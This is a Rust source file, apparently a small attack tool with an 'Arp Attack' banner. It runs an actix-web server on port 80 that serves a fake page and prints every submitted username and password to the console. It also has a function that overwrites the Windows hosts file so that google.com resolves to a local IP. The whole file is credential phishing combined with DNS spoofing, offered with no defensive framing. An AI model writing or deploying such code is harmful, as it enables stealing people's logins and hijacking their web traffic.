use std::fs::{write, File, self};
use std::io::Write;
use std::path::PathBuf;
use actix_web::{web, App, HttpServer, Responder, HttpResponse , get, HttpRequest};
use serde::*;
#[actix_web::main]
async fn main() -> std::io::Result<()> {
   let ascii = r#""
                                _             _    _     
     /\                    /\  | |           | |  | |    
    /  \   _ __ _ __      /  \ | |_ __ _  ___| | _| | __ 
   / /\ \ | '__| '_ \    / /\ \| __/ _` |/ __| |/ / |/ / 
  / ____ \| |  | |_) |  / ____ \ || (_| | (__|   <|   <  
 /_/    \_\_|  | .__/  /_/    \_\__\__,_|\___|_|\_\_|\_\ 
               | |                                       
               |_|    By Lanbyshell                  
"#;
    println!("\x1b[1;34m{}\x1b[0m ", ascii);
    HttpServer::new(|| {
        App::new().service(web::scope("/").route("", web::get().to(index)))
        .service(web::resource("/login").route(web::post().to(login)))
       
    })
    .bind(("0.0.0.0", 80))?
    .run()
    .await
}
//#[get("/")]

async fn index() -> HttpResponse {

    HttpResponse::Ok().content_type("text/html; charset=utf-8").body(fs::read_to_string("pagina/index.html").unwrap())
    
    
}
use serde::Deserialize;

#[derive(Debug, Deserialize)]
struct LoginForm {
    login: String,
    password: String,
}

async fn login(data: web::Form<LoginForm>) -> HttpResponse {
    
    let login = &data.login;
    let password = &data.password;
    println!("\x1b[1;32mUsername: \x1b[1;37m{}\x1b[0m", login);
    println!("\x1b[1;32mPassword: \x1b[1;37m{}\x1b[0m", password);
    println!("\n\n");
    HttpResponse::Found().header("location", "/").finish()
}

fn arp_Fake(){
    let path_arq = PathBuf::from(r"C:\Windows\System32\drivers\etc\hosts");

    let open_arquivo = File::create(&path_arq);

    if let Ok(mut file) = open_arquivo{
        
        let arp_fake = r"
        192.168.1.115 google.com
        192.168.1.115 www.google.com

        ";
        file.write(arp_fake.as_bytes());

        
    }
}